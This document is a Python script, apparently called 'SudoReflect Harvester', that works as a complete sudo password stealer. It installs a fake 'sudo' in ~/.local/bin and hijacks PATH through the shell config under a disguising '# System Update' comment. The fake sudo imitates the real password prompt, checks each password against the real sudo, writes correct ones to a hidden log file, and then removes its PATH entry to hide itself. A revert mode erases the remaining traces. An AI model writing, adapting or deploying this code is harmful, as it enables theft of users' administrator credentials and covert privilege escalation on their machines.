import os
import sys
import getpass
import subprocess
import argparse

BIN_DIR = os.path.expanduser("~/.local/bin")
LOG_DIR = os.path.expanduser("~/.local/.cache")
LOG_FILE = os.path.join(LOG_DIR, "sys_log.txt")
SUDO_SCRIPT = os.path.join(BIN_DIR, "sudo")
REAL_SUDO = "/usr/bin/sudo"

def get_shell_config():
    shell = os.environ.get("SHELL", "")
    if "zsh" in shell:
        return os.path.expanduser("~/.zshrc")
    return os.path.expanduser("~/.bashrc")

SNIFFER_CODE = f"""#!/usr/bin/env python3
import os, sys, getpass, subprocess

LOG_FILE = "{LOG_FILE}"
REAL_SUDO = "{REAL_SUDO}"

def cleanup():
    shell_cfg = "{get_shell_config()}"
    if os.path.exists(shell_cfg):
        with open(shell_cfg, "r") as f:
            lines = f.readlines()
        with open(shell_cfg, "w") as f:
            f.writelines([l for l in lines if ".local/bin" not in l])

def main():
    if not os.path.exists("{LOG_DIR}"):
        os.makedirs("{LOG_DIR}")

    tries = 0
    while tries < 3:
        prompt = f"[sudo] password for {{getpass.getuser()}}: "
        password = getpass.getpass(prompt)
        
        # Validate stealthily
        check = subprocess.Popen([REAL_SUDO, "-S", "-v"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        _, _ = check.communicate(input=password + "\\n")

        if check.returncode == 0:
            with open(LOG_FILE, "a") as f:
                f.write(f"captured: {{password}}\\n")
            subprocess.run([REAL_SUDO, "-S"] + sys.argv[1:], input=password + "\\n", text=True)
            cleanup()
            return
        else:
            print("sudo: 1 incorrect password attempt" if tries == 0 else f"sudo: {{tries+1}} incorrect password attempts")
            tries += 1
    print("sudo: 3 incorrect password attempts", file=sys.stderr)
    sys.exit(1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(1)
"""

def deploy():
    print(f"[*] starting deployment for {getpass.getuser()}...")
    
    os.makedirs(BIN_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)

    with open(SUDO_SCRIPT, "w") as f:
        f.write(SNIFFER_CODE)
    os.chmod(SUDO_SCRIPT, 0o755)
    print(f"[+] sniffer installed at {SUDO_SCRIPT}")

    config_path = get_shell_config()
    injection = f'export PATH="{BIN_DIR}:$PATH"\n'
    
    with open(config_path, "r") as f:
        content = f.read()
    
    if injection not in content:
        with open(config_path, "a") as f:
            f.write(f"\n# System Update\n{injection}")
        print(f"[+] path injected into {config_path}")
    
    print("\n[DONE] deployment successful. restart terminal or run 'source' to activate.")

def revert():
    print("[*] reverting changes...")
    
    config_path = get_shell_config()
    if os.path.exists(config_path):
        with open(config_path, "r") as f:
            lines = f.readlines()
        with open(config_path, "w") as f:
            f.writelines([l for l in lines if ".local/bin" not in l])
        print(f"[-] cleaned {config_path}")

    for target in [SUDO_SCRIPT, LOG_FILE]:
        if os.path.exists(target):
            os.remove(target)
            print(f"[-] deleted {target}")

    print("\n[DONE] system restored. run 'hash -r' to reset your path cache.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SudoReflect Harvester")
    parser.add_argument("--deploy", action="store_true", help="install and automate path hijacking.")
    parser.add_argument("--revert", action="store_true", help="remove all traces and restore shell config.")
    
    args = parser.parse_args()

    if args.deploy:
        deploy()
    elif args.revert:
        revert()
    else:
        parser.print_help()
